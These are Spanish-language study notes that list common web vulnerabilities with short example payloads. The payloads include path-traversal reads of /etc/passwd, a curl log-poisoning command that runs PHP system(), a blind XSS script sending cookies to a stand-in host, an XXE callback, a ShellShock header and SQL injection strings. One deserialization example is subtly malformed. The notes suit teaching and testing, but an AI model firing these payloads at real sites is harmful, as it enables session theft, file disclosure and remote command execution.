# Apuntes de las Vulnerabilidades web mas comunes

## 1. Local File Inclusion (LFI)
Permite a un atacante incluir archivos locales del servidor, típicamente mediante parámetros vulnerables:
- https://localhost/myweb.php?idioma=es → https://localhost/myweb.php?idioma=/etc/passwd
<br>***Evasión y trucos:***

- Si solo permite `.txt`, prueba _null byte injection_:
	- https://localhost/myweb.php?idioma=/etc/passwd%00.txt`
	- El `%00` termina la cadena antes de que añadan `.txt` internamente (antiguo truco PHP, pero aún puede funcionar en entornos legacy).
- Si restringen a una ruta específica (`/var/www/html/lang/`) → _Path Traversal_:
	- `https://localhost/myweb.php?idioma=../../../../../../etc/passwd`
(Prueba también con `.` codificado (`%2e`) o combinaciones como `%2e%2e/` para saltarte filtros)

---

## 2. Wrappers
PHP tiene "envoltorios" como `php://input` o `data://` que permiten acceder a flujos como si fueran archivos. Permiten acceder a flujos como si fueran archivos:

- `php://input` → Accede al cuerpo de la petición (POST)
- `data://` → Ejecuta datos embebidos como archivo
- `file://` → Accede a archivos locales
- `zip://`, `phar://`, `glob://`, etc.
Puedes enviar tu propio código PHP en el body con un `POST` y se ejecutará.

---

## 3. Log Poisoning
Cuando tenemos LFI, podemos enumerar archivos LOGs (la mayoría se encuentran en /var/log). De esta manera, si podemos encontrar logs de registro de acceso por ejemplo, podemos ejecutar comandos haciendo accesos con código php, i que se interpreten al acceder al log. Se basa en inyectar código malicioso en archivos de log, que luego son incluidos mediante LFI.
```
curl -s -H "User-Agent: <?php system('whoami'); ?>" "http://localhost/myweb.php?file=/var/log/apache2/access.log"
```

---

## 4. Remote File Inclusion (RFI)
Similar al LFI pero permitiendo incluir archivos remotos, como scripts maliciosos. Pero cuidado, porque solo funciona si `allow_url_include` está activado.

---

## 5. HTML Injection
Inyectar HTML (no JavaScript) en una página. No ejecuta JS, pero puede usarse para phishing o manipular el DOM.
```
<b>¡Hola admin!</b><form action="...">
```
También puede permitirte meter un `<img src="javascript:...">` o un `<form>` trampa.

---

## 6. Cross-Site Scripting (XSS)
Inyección de JavaScript en páginas web. Con esto puedes:
- Robar cookies
- Secuestrar sesiones
- Modificar el DOM
- Redirigir al usuario
Ejemplo clásico: ``<script>alert('XSS');</script>``

---

## 7. Blind XSS
Similar al XSS, pero el payload se ejecuta en otra parte (ej: panel de admin). En este caso, el caso básico sería meter `<script>fetch('https://tuyo.com?c='+document.cookie)</script>` en un campo. No ves nada, pero cuando el admin entra le puedes robar las cookies.

---

## 8. Cross-Site Request Forgery (CSRF)
Engañas a un usuario logueado para que haga una acción sin querer (cambiar su contraseña, transferencias...) → haces que el navegador de otro mande una petición sin que lo sepa.
Ejemplo: ``<img src="http://victima.com/change_password?new=1234" />`` → Si la sesión está activa, cambia la contraseña sin preguntar.
Solución: usar tokens CSRF y comprobar métodos (GET/POST).

---

## 9. Server-Side Request Forgery (SSRF)
Usas el servidor como proxy para hacer peticiones internas (acceder a `127.0.0.1`, metadatos en la nube, etc). Ideal para escanear la red interna o acceder a servicios restringidos (admin panels internos, metadata cloud...).

---

## 10. SQL Injection / Error-Based
Inyección de SQL que revela errores útiles para explotación.
```
' OR 1=1 --
```
Si los errores se muestran, puedes exfiltrar datos fácilmente:
```
' UNION SELECT null, version(), database() --
```

---

## 11. SQL Injection / Time-Based (Blind)
No ves errores, pero puedes inferir la respuesta usando funciones como `SLEEP()`:
```
' OR IF(1=1, SLEEP(5), 0) --
```
Si tarda 5 segundos… algo va bien (hemos descubierto SQLi blind).

---

## 12. Padding Oracle Attack (Padbuster)
Ataque contra cifrados por bloques (como CBC) usando errores para deducir el padding y descifrar info. Si una cookie cifrada provoca diferentes errores según el padding, se puede descifrar byte a byte. Una herramienta clásica es *padbuster.pl*.

---

## 13. Padding Oracle Attack (Bit Flipper / BurpSuite)
Misma idea que el Padding Oracle Attack, pero en vez de descifrar, modificas contenido→ modificas bits del ciphertext para forzar un resultado concreto tras el descifrado (como elevar privilegios). Un ejemplo sería cambiar `user=normal` a `user=admin` *flipping bits* hasta que el descifrado te da privilegios elevados.

---

## 14. ShellShock
Vulnerabilidad en Bash que permite ejecutar comandos inyectados en variables de entorno. Ejecutar comandos al pasar valores maliciosos en headers o variables de entorno. Afecta a servidores CGI antiguos.
```
User-Agent: () { :; }; /bin/bash -c 'id'
```

---

## 15. XML External Entity Injection (XXE)
Ataque a parsers XML que permiten definir entidades externas, lo que permite leer archivos o hacer SSRF. Peligroso en APIs SOAP/XML.
```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

---

## 16. Blind XXE
Igual que XXE, pero no ves la respuesta. Tienes que usar un "canal lateral", como forzar peticiones DNS:
```
<!ENTITY % ext SYSTEM "http://tuo.dominio.com/pwn">
```

---

## 17. Domain Zone Transfer (AXFR)
Obtener toda la zona DNS de un dominio si el servidor DNS está mal configurado.
```
dig axfr @dns.victima.com victima.com
```

---

## 18. Deserialization Attacks
Envío de datos serializados (como objetos PHP, Java, Python...) que al deserializar ejecutan código malicioso. Ejemplo en PHP:
```
O:8:"Exploit":1:{s:4:"data";s:13:"<?php info(); ?>";}
```

---

## 19. Type Juggling
Explotar cómo PHP (u otros lenguajes) comparan tipos distintos (strings vs ints):
```
if ($_POST['auth'] == "0e12345") // vulnerable
```
Autenticación bypass.

---

## 20. Virtual Hosting
Dentro del mismo puerto se pueden ejecutar mas de 1 subdominio web, y para listarlos podemos usar la herramienta *wfuzz*


